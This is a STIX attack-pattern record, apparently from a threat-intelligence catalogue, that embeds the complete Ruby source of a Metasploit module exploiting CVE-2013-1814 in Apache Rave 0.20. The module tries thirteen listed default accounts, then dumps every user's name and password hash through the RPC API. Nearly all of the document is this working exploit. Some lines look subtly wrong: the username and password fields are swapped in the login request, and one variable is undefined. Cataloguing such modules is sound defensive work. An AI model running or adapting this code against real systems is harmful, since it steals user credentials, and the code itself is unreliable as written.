{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e79ce42b-460a-4bdf-b21f-3703114e23c8",
    "created": "2024-08-14T16:32:20.259645Z",
    "modified": "2024-08-14T16:32:20.259649Z",
    "name": "Apache Rave User Information Disclosure",
    "description": " This module exploits an information disclosure in Apache Rave 0.20 and prior. The vulnerability exists in the RPC API, which allows any authenticated user to disclose information about all the users, including their password hashes. In order to authenticate, the user can provide his own credentials. Also the default users installed with Apache Rave 0.20 will be tried automatically. This module has been successfully tested on Apache Rave 0.20.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/apache_rave_creds.rb",
            "external_id": "apache_rave_creds.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-1814"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Apache Rave User Information Disclosure',\n      'Description'    => %q{\n        This module exploits an information disclosure in Apache Rave 0.20 and prior. The\n        vulnerability exists in the RPC API, which allows any authenticated user to\n        disclose information about all the users, including their password hashes. In order\n        to authenticate, the user can provide his own credentials. Also the default users\n        installed with Apache Rave 0.20 will be tried automatically. This module has been\n        successfully tested on Apache Rave 0.20.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Andreas Guth', # Vulnerability discovery and PoC\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2013-1814' ],\n          [ 'OSVDB', '91235' ],\n          [ 'BID', '58455' ],\n          [ 'EDB', '24744']\n        ]\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('TARGETURI', [true, 'Path to Apache Rave Portal', '/portal']),\n        OptString.new('USERNAME', [ false, 'Apache Rave Username' ]),\n        OptString.new('PASSWORD', [ false, 'Apache Rave Password' ]),\n      ])\n  end\n\n  def post_auth?\n    true\n  end\n\n  def login(username, password)\n    uri = normalize_uri(target_uri.to_s, \"j_spring_security_check\")\n\n    res = send_request_cgi({\n      'uri'      => uri,\n      'method'   => 'POST',\n      'vars_post' => {\n        'j_password' => username,\n        'j_username' => password\n      }\n    })\n\n    if res and res.code == 302 and res.headers['Location'] !~ /authfail/ and res.get_cookies =~ /JSESSIONID=(.*);/\n      return $1\n    else\n      return nil\n    end\n  end\n\n  def disclose(cookie, offset)\n    uri = normalize_uri(target_uri.to_s, \"app\", \"api\", \"rpc\", \"users\", \"get\")\n\n    res = send_request_cgi({\n      'uri'      => uri,\n      'method'   => 'GET',\n      'vars_get' => {\n        'offset' => \"#{offset}\"\n      },\n      'cookie' => \"JSESSIONID=#{cookie}\"\n    })\n\n    if res and res.code == 200 and res.headers['Content-Type'] =~ /application\\/json/ and res.body =~ /resultSet/\n      return res.body\n    else\n      return nil\n    end\n\n  end\n\n  def setup\n    # Default accounts installed and enabled on Apache Rave 0.20\n    @default_accounts = {\n      \"canonical\" => \"canonical\",\n      \"john.doe\" => \"john.doe\",\n      \"jane.doe\" => \"jane.doe\",\n      \"johnldap\" => \"johnldap\",\n      \"four.col\" => \"four.col\",\n      \"fourwn.col\" => \"fourwn.col\",\n      \"george.doe\" => \"george.doe\",\n      \"maija.m\" => \"maija.m\",\n      \"mario.rossi\" => \"mario.rossi\",\n      \"one.col\" => \"one.col\",\n      \"three.col\" => \"three.col\",\n      \"threewn.col\" => \"threewn.col\",\n      \"twown.col\" => \"twown.col\"\n    }\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n\n  def run\n\n    print_status(\"#{rhost}:#{rport} - Fingerprinting...\")\n    res = send_request_cgi({\n      'uri'      => normalize_uri(target_uri.to_s, \"login\"),\n      'method'   => 'GET',\n    })\n\n    if not res\n      print_error(\"#{rhost}:#{rport} - No response, aborting...\")\n      return\n    elsif res.code == 200 and res.body =~ /<span>Apache Rave ([0-9\\.]*)<\\/span>/\n      version =$1\n      if version <= \"0.20\"\n        print_good(\"#{rhost}:#{rport} - Apache Rave #{version} found. Vulnerable. Proceeding...\")\n      else\n        print_error(\"#{rhost}:#{rport} - Apache Rave #{version} found. Not vulnerable. Aborting...\")\n        return\n      end\n    else\n      print_warning(\"#{rhost}:#{rport} - Apache Rave Portal not found, trying to log-in anyway...\")\n    end\n\n    cookie = nil\n    unless datastore[\"USERNAME\"].empty? or datastore[\"PASSWORD\"].empty?\n      print_status(\"#{rhost}:#{rport} - Login with the provided credentials...\")\n      cookie = login(datastore[\"USERNAME\"], datastore[\"PASSWORD\"])\n      if cookie.nil?\n        print_error(\"#{rhost}:#{rport} - Login failed\")\n      else\n        print_good(\"#{rhost}:#{rport} - Login Successful. Proceeding...\")\n      end\n    end\n\n    if cookie.nil?\n      print_status(\"#{rhost}:#{rport} - Login with default accounts...\")\n      @default_accounts.each { |user, password|\n        print_status(\"#{rhost}:#{rport} - Login with the #{user} default account...\")\n        cookie = login(user, password)\n        unless cookie.nil?\n          print_good(\"#{rhost}:#{rport} - Login Successful. Proceeding...\")\n          break\n        end\n      }\n    end\n\n    if cookie.nil?\n      print_error(\"#{rhost}:#{rport} - Login failed. Aborting...\")\n      return\n    end\n\n    print_status(\"#{rhost}:#{rport} - Disclosing information...\")\n    offset = 0\n    search = true\n\n    while search\n      print_status(\"#{rhost}:#{rport} - Disclosing offset #{offset}...\")\n      users_data = disclose(cookie, offset)\n      if users_data.nil?\n        print_error(\"#{rhost}:#{rport} - Disclosure failed. Aborting...\")\n        return\n      else\n        print_good(\"#{rhost}:#{rport} - Disclosure successful\")\n      end\n\n      json_info = JSON.parse(users_data)\n\n      path = store_loot(\n        'apache.rave.users',\n        'application/json',\n        rhost,\n        users_data,\n        nil,\n        \"Apache Rave Users Database Offset #{offset}\"\n      )\n      print_status(\"#{rhost}:#{rport} - Information for offset #{offset} saved in: #{path}\")\n\n      print_status(\"#{rhost}:#{rport} - Recovering Hashes...\")\n      json_info[\"result\"][\"resultSet\"].each { |result|\n        print_good(\"#{rhost}:#{rport} - Found cred: #{result[\"username\"]}:#{result[\"password\"]}\")\n        report_cred(\n          ip: rhost,\n          port: rport,\n          service_name: 'Apache Rave',\n          user: result[\"username\"],\n          password: result[\"password\"],\n          proof: user_data\n        )\n      }\n\n      page = json_info[\"result\"][\"currentPage\"]\n      total_pages = json_info[\"result\"][\"numberOfPages\"]\n      offset = offset + json_info[\"result\"][\"pageSize\"]\n      if page == total_pages\n        search = false\n      end\n\n    end\n\n  end\nend\n"
}